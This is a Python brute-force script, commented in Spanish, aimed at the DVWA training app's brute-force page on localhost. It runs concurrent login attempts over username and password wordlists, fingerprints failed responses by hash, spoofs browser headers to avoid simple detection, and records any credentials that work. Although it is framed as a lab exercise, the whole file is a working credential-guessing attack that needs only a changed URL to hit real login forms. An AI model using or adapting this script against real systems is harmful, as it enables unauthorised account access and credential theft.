#!/usr/bin/env python3
"""
brute_requests.py
Ataque de fuerza bruta (laboratorio) contra /vulnerabilities/brute/ (DVWA).
Requisitos: pip install requests
Uso: python3 brute_requests.py usuarios.txt passwords.txt
"""

import sys
import requests
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import product
from pathlib import Path
import time
import os
from threading import Lock

# ---------- CONFIG ----------
URL = "http://127.0.0.1:4280/vulnerabilities/brute/"   # ajusta si es otra IP/puerto
# Cookie solicitada por el usuario:
COOKIE = {
    "security": "low",
    "PHPSESSID": "7bfdf4fc11a55ac219a0c3549c3f843f"
}
SUCCESS_STR = "Welcome to the password protected"
CONCURRENCY = 6          # ajustar según recursos; 6 es razonable para laboratorio
REQUEST_TIMEOUT = 8      # segundos
OUTPUT_FOUND = "python_bruteforce_results.txt"
# ----------------------------

session = requests.Session()
# cabeceras para parecer navegador (reduce detecciones triviales)
session.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (BruteScript/1.0)",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "es-ES,es;q=0.9",
    "Referer": URL
})
# set cookies for the session
for k, v in COOKIE.items():
    if v:
        session.cookies.set(k, v)

def get_base_fail_hash():
    """
    Obtiene el hash SHA256 de la página de fallo conocida (login fallido),
    para comparar huellas y reducir falsos positivos.
    """
    r = session.get(URL, params={"username": "__this_user_does_not_exist__", "password": "badpass", "Login": "Login"}, timeout=REQUEST_TIMEOUT)
    body = r.text
    h = hashlib.sha256(body.encode("utf-8")).hexdigest()
    return h, len(body)

def try_login(user, pwd, base_fail_hash=None):
    """
    Intenta login con GET (porque el formulario usa GET).
    Devuelve un dict con resultado y info útil.
    """
    try:
        r = session.get(URL, params={"username": user, "password": pwd, "Login": "Login"}, timeout=REQUEST_TIMEOUT)
        body = r.text
        h = hashlib.sha256(body.encode("utf-8")).hexdigest()
        if base_fail_hash and h == base_fail_hash:
            return {"user": user, "pass": pwd, "result": "FAIL", "hash": h, "len": len(body)}
        if SUCCESS_STR in body:
            return {"user": user, "pass": pwd, "result": "SUCCESS", "hash": h, "len": len(body)}
        return {"user": user, "pass": pwd, "result": "AMBIGUOUS", "hash": h, "len": len(body), "snippet": body[:300]}
    except Exception as e:
        return {"user": user, "pass": pwd, "result": "ERROR", "error": str(e)}

def main(users_file, passwords_file):
    users = [u.strip() for u in Path(users_file).read_text(encoding="utf-8").splitlines() if u.strip()]
    passwords = [p.strip() for p in Path(passwords_file).read_text(encoding="utf-8").splitlines() if p.strip()]

    # (opcional) deduplicar entradas en memoria por si acaso
    users = list(dict.fromkeys(users))
    passwords = list(dict.fromkeys(passwords))

    print(f"[i] Usuarios: {len(users)}, Passwords: {len(passwords)}")
    base_hash, base_len = get_base_fail_hash()
    print(f"[i] Huella base fallo: {base_hash}  (len {base_len})")
    combos = product(users, passwords)  # generator, no lista en memoria

    found = []
    ambiguous = []

    # estructuras para evitar duplicados en concurrencia
    found_set = set()
    found_lock = Lock()

    start = time.time()
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
        # Submit tareas: se itera sobre el generator combos
        futures = {ex.submit(try_login, u, p, base_hash): (u, p) for u, p in combos}
        for fut in as_completed(futures):
            res = fut.result()
            if res["result"] == "SUCCESS":
                pair = f"{res['user']}:{res['pass']}"
                # sección crítica: comprobar y escribir una sola vez
                with found_lock:
                    if pair not in found_set:
                        found_set.add(pair)
                        found.append((res['user'], res['pass']))
                        # escribir inmediatamente al archivo (una sola vez)
                        with open(OUTPUT_FOUND, "a", encoding="utf-8") as fh:
                            fh.write(f"{pair}\n")
                        print(f"[FOUND] {pair}  (len={res['len']})")
                    else:
                        # ya registrado, ignorar
                        pass
            elif res["result"] == "AMBIGUOUS":
                ambiguous.append(res)
            # no imprimir cada FAIL para no llenar la salida
    elapsed = time.time() - start
    print(f"[i] Tiempo total: {elapsed:.1f}s")
    print("[i] Encontrados:")
    for u, p in found:
        print(f"  - {u}:{p}")
    if ambiguous:
        print("[i] Ambiguous (guardar para inspección):", len(ambiguous))
        Path("ambiguous_samples.txt").write_text("\n\n".join(f"{a['user']}:{a['pass']}\n{a.get('snippet','')}" for a in ambiguous), encoding="utf-8")
    return found

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Uso: python3 brute_requests.py usuarios.txt passwords.txt")
        sys.exit(1)
    # borrar archivo de resultados previo si existe
    try:
        Path(OUTPUT_FOUND).unlink()
    except Exception:
        pass
    found = main(sys.argv[1], sys.argv[2])
    if not found:
        print("No se encontraron credenciales en esta corrida.")
    else:
        print(f"[i] Resultados guardados en {OUTPUT_FOUND}")
